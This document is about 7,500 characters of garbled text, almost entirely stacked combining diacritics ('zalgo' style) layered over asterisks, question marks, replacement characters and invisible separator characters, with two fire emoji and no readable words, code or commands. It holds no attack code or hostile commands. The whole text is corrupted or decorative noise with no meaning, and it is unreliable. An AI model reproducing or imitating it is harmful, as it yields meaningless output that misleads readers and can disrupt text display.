̢̯̠͔̟̰͔̞̮̦̫͔̖̦̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̛̛͛́̿́͐̾̀̇̕̕̚̕